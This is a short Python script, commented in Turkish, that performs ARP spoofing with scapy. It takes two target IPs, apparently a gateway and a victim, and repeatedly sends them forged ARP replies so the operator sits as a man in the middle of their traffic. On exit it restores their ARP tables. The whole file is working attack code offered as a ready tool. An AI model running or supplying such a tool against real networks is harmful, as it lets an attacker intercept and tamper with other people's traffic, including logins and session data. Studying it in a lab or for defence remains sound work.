import optparse
import re
import subprocess
import scapy.all as scapy
import time
from rich import print
import threading
import sys

def get_target_ips():
    # Konsoldan --target1 ve --target2 parametrelerini alır.
    parse_obj = optparse.OptionParser()
    parse_obj.add_option("--target1", dest="dest1", help="first target IP")
    parse_obj.add_option("--target2", dest="dest2", help="second target IP")

    # 2 değişkenden biri gateway için, diğeri hedef PC için.
    options = parse_obj.parse_args()[0]

    if not options.dest1 or not options.dest2:
        print("pls set the destinations ip..")

    return parse_obj.parse_args()

def ip_to_mac(ip):
    # Verilen IP adresine karşılık gelen MAC adresini döndürür.
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    if answered_list:
        return answered_list[0][1].hwsrc  # İlk yanıtın MAC adresini döndür
    else:
        return None  # MAC adresi bulunamazsa None döndür



# ip_1 ve ip_2 hedef1 ve hedef2 ip olarak tanımlarız.
# fonksiyon 2 türlü çalıştırılacak.
# ARP_spoof(ip_1, ip_2) ve ARP_spoof(ip_2, ip_1)
def ARP_spoof(ip_1, ip_2):  
    PDST_mac = ip_to_mac(ip_1)
    if PDST_mac is None:
        print(f"[red]Hedef IP ({ip_1}) için MAC adresi alınamadı![/red]")
        return

    # ethernet çerçevesi oluştur (hwdst ile hedef MAC belirt)
    ether = scapy.Ether(dst=PDST_mac)
    arp_response = scapy.ARP(op=2, pdst=ip_1, hwdst=PDST_mac, psrc=ip_2)

    # ethernet + ARP paketini birleştirerek gönder
    scapy.sendp(ether / arp_response, verbose=False)

# ip_1 ve ip_2 hedef1 ve hedef2 ip olarak tanımlarız.
# fonksiyon 2 türlü çalıştırılacak.
# ARP_spoof(ip_1, ip_2) ve ARP_spoof(ip_2, ip_1)
# eski arp tablosunu restore eder.
def ARP_reset(ip_1, ip_2):  
    PDST_mac = ip_to_mac(ip_1)
    gateway_mac = ip_to_mac(ip_2)

    if PDST_mac is None or gateway_mac is None:
        print(f"[red]MAC adresleri alınamadı, reset işlemi başarısız![/red]")
        return

    ether = scapy.Ether(dst=PDST_mac)
    arp_response = scapy.ARP(op=2, pdst=ip_1, hwdst=PDST_mac, psrc=ip_2, hwsrc=gateway_mac)

    # ethernet + ARP paketini birleştirerek gönder (5 kez)
    scapy.sendp(ether / arp_response, verbose=False, count=5)

stop_event = threading.Event()

def monitor_input(): # x + enter , işlemi durdurcak..
    while True:
        if input().strip().upper() == 'X':
            stop_event.set()
            break

input_thread = threading.Thread(target=monitor_input)
input_thread.daemon = True
input_thread.start()


(inputs, arguments) = get_target_ips()  # tuple ataması
dest1 = inputs.dest1
dest2 = inputs.dest2
print("press x and enter for quit")
print("\n[green]packets sending..[/green]")

try:
   
    while not stop_event.is_set():
        ARP_spoof(dest1, dest2)
        ARP_spoof(dest2, dest1)
        
        
        
        time.sleep(5)

except Exception as e: 
    print(f"\n[red]Error: {e}[/red]")

finally:    
    print("\n[blue]Resetting ARP tables...[/blue]")
    ARP_reset(dest1, dest2)
    ARP_reset(dest2, dest1)
    print("[green]you are no longer the man in the middle :)[/green]")
    print("[green]ARP tables restored. Exiting.[/green]")
    sys.exit()
